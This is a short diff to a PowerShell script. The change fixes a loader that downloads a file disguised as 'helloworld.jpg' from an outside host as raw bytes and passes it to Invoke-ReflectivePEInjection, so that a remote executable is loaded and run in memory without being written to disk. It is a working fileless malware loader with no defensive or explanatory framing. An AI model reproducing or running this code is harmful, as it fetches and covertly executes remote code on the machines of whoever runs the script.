@@ -2608,6 +2608,6 @@ Main
 }
 
 
-$eee=(New-Object Net.WebClient).DownloadString('https://www.moonlightwatch.me/helloworld.jpg')
+$eee=(New-Object Net.WebClient).DownloadData('https://www.moonlightwatch.me/helloworld.jpg')
 
 Invoke-ReflectivePEInjection -PEBytes $eee
